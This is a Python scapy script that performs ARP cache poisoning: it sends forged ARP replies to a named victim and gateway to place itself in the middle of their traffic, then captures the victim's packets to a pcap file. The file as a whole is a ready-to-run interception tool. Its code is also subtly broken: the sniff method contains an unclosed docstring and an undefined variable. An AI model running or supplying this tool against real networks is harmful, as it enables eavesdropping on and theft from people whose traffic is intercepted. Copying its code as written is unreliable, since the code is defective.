from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

def get_mac(targetip):
    # pass in target IP and make a packet
    # Target is broadcast (ff:ff:ff:ff:ff:ff) and asks if each node is the targetip
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    # srp() sends and receives packets on layer 2
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f"Initialized interface {interface}:")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}")
        print(f"Victim ({victim}) is at {self.victimmac}")
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    '''
    Send to gateway: victim's IP, attacker's MAC
    Send to victim: gateway's IP, attacker's MAC
    Info is printed to screen to verify
    '''
    def poison(self):
        # Sets up info we use to poison the victim
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f"ip src: {poison_victim.psrc}")
        print(f"ip dst: {poison_victim.pdst}")
        print(f"mac dst: {poison_victim.hwdst}")
        print(f"mac src: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print('-' * 30)

        # Creates a poisoned arp packet for the gateway
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f"ip src: {poison_gateway.psrc}")
        print(f"ip dst: {poison_gateway.pdst}")
        print(f"mac dst: {poison_gateway.hwdst}")
        print(f"mac src: {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print('-' * 30)

        print('Beginning ARP poison [CTRL-C] to stop')
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                # When stopped, send the correct info to reverse the poisoning
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        '''
        # Sleep for 5 to let the threads start properly
        time.sleep(5)
        print(f"Sniffing {count} packets")
        # Filters for packets that have the designated IP address
        bpf_filter = 'ip host %s' % victim
        packets = sniff(count=count, filter=bpf_filter, iface = self.interface)
        # Will write the captures packets to a file (arper.pcap)
        wrpcap('arper.pcap', packets)
        print('Packets received')
        self.restore()
        self.poison_thread.terminate()
        print('Finished')

    def restore(self):
        # Called from either the poison method if [CTRL-C] is hit or from sniff when x amount of packets are captured
        print("Restoring ARP tables... ")
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)

if __name__ == "__main__":
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    a1 = Arper(victim, gateway, interface)
    a1.run()
